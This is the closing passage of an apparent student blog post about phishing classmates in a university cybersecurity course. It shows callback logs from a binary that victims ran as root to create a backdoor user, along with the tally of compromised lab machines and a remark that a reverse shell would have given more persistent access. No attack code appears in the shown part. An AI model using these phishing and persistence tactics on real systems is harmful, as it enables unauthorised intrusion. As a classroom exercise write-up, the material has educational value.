prim">1</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;msg&quot;: &quot;Script launched!&quot;,"><span class="lineCounter-0-0-9">2</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"Script launched!"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.141&quot;"><span class="lineCounter-0-0-9">3</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.141"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9">4</span><span class="token punctuation">}</span></div><br><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 prim">5</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;msg&quot;: &quot;Successfuly created user.!! <3&quot;,"><span class="lineCounter-0-0-9">6</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"Successfuly created user.!! &lt;3"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.141&quot;"><span class="lineCounter-0-0-9">7</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.141"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9">8</span><span class="token punctuation">}</span></div><br><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9">9</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;msg&quot;: &quot;Script launched!&quot;,"><span class="lineCounter-0-0-9 prim">10</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"Script launched!"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.141&quot;"><span class="lineCounter-0-0-9">11</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.141"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9">12</span><span class="token punctuation">}</span></div><br><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9">13</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;msg&quot;: &quot;Error during creating user: exit status 9&quot;,"><span class="lineCounter-0-0-9">14</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"Error during creating user: exit status 9"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.141&quot;"><span class="lineCounter-0-0-9 prim">15</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.141"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9">16</span><span class="token punctuation">}</span></div><br><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9">17</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;msg&quot;: &quot;Script launched!&quot;,"><span class="lineCounter-0-0-9">18</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"Script launched!"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.141&quot;"><span class="lineCounter-0-0-9">19</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.141"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9 prim">20</span><span class="token punctuation">}</span></div><br><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9">21</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;msg&quot;: &quot;Error during creating user: exit status 9&quot;,"><span class="lineCounter-0-0-9">22</span>  <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"Error during creating user: exit status 9"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.141&quot;"><span class="lineCounter-0-0-9">23</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.141"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9 prim">24</span><span class="token punctuation">}</span></div><br></code></pre><p><span>The <code>exit status 9</code> indicates that the user already exists. Magnificent. Not only that our program was executed with root privileges straight away, but it was also run multiple times.</span></p><p><span>Nonetheless, in the end, we collected "only" two new machines to our collection. Unfortunately, we have no track of how many people actually downloaded the binary file. By the way, at the end of the semester, we still have access to those two machines. </span></p><p><span>We assume that the reason for having a smaller success was our already known IP address, which could discourage or scare some potential victims. Also, this approach was not so straightforward in comparison with the first one.</span></p><h2 id="conclusion" class="heading-0-0-1"><span class="icon-font">link</span><span>Conclusion</span></h2><p><span>By using a simple Python and Golang coding skill with basic knowledge of Linux tools and with near to zero experience with hacking or social engineering, we were able to gain access to multiple virtual machines belonging to students of <a href="https://www.fel.cvut.cz/en/education/bk/predmety/47/02/p4702106.html">Cyber Security</a> at FEE CTU.</span></p><p><span>After finishing all practices, we realize that a lot of situations could be handled in a more sophisticated way. For example, dealing with the same situation today, we would choose to maintain persistence using reverse shell instead of creating user, which can be easily detected.</span></p><p><span>To sum this up, totally we gained nine accesses to different virtual machines and yet five of them still remain active - even after the "find intruders" class. </span></p><h2 id="appendix" class="heading-0-0-1"><span class="icon-font">link</span><span>Appendix</span></h2><ul><li><span><a href="https://github.com/LukasForst/BSY">Github repository</a> with majority of used source-code</span></li></ul><div class="contentnav-0-0-7" data-no-search=""><a href="#phishing-cybersecurity-students" class="h1" data-content-highlight="phishing-cybersecurity-students">Phishing cybersecurity students</a><a href="#background" class="h2" data-content-highlight="background">Background</a><a href="#first-assignment" class="h2" data-content-highlight="first-assignment">First Assignment</a><a href="#lets-have-some-fun" class="h3" data-content-highlight="lets-have-some-fun">Let's have some fun</a><a href="#just-ask-for-the-password" class="h3" data-content-highlight="just-ask-for-the-password">Just ask for the password</a><a href="#even-experts-can-be-fooled" class="h4" data-content-highlight="even-experts-can-be-fooled">Even experts can be fooled</a><a href="#lets-fake-real-service" class="h3" data-content-highlight="lets-fake-real-service">Let's fake real service</a><a href="#automating-the-password-verification" class="h3" data-content-highlight="automating-the-password-verification">Automating the password verification</a><a href="#realizing-the-mistake" class="h3" data-content-highlight="realizing-the-mistake">Realizing the mistake</a><a href="#faster-than-the-victim" class="h3" data-content-highlight="faster-than-the-victim">Faster than the victim</a><a href="#spreading-the-infection" class="h3" data-content-highlight="spreading-the-infection">Spreading the infection</a><a href="#defending-the-access" class="h3" data-content-highlight="defending-the-access">Defending the access</a><a href="#summary" class="h3" data-content-highlight="summary">Summary</a><a href="#second-assignment" class="h2" data-content-highlight="second-assignment">Second assignment</a><a href="#the-plan" class="h3" data-content-highlight="the-plan">The plan</a><a href="#implementation" class="h3" data-content-highlight="implementation">Implementation</a><a href="#results" class="h3" data-content-highlight="results">Results</a><a href="#conclusion" class="h2" data-content-highlight="conclusion">Conclusion</a><a href="#appendix" class="h2" data-content-highlight="appendix">Appendix</a></div></div><div id="-codedoc-toc" class="toc-0-0-4"><div class="content-0-0-5"><p><span><a href="/">Home</a>
<a href="/posts/cheat-sheet">Markdown Cheat Sheet</a>
<a href="/posts/code-features">Code Features</a>
<a href="/posts/test">Test</a>
<a href="/posts/bsy-hacks">BSY hacks</a></span></p><p><span><br><br></span></p><p><span>To add links to your other documents, simply
modify contents of <code>docs/md/_toc.md</code>.</span></p></div><div class="search-0-0-6"><script id="TnQGEhwbNX">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("TnQGEhwbNX", "LvkoierC0H6p/0iHfmnaPw==", {"repo":"blog","user":"LukasForst","root":"markdown","pick":"\\.md$","drop":"(^_)|(\\/_)"});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div></div><div class="footer-0-0-3"><div class="left"><script id="tawJMFvvmd">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("tawJMFvvmd", "k0lYj9deiYXngpZFqYY0vQ==", {});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div><div class="main"><div class="inside"><a href="https://github.com/LukasForst/blog/" target="_blank">GitHub</a></div></div><div class="right"><script id="T_gVjCCNWj">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("T_gVjCCNWj", "QtGDrozMmpfzLYU0jY3n+w==", {});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div></div><script id="vqeE_AZAhe">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("vqeE_AZAhe", "Rs0VnrLCFSwfOm1o3R6OHg==", {"namespace":""});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></body></html>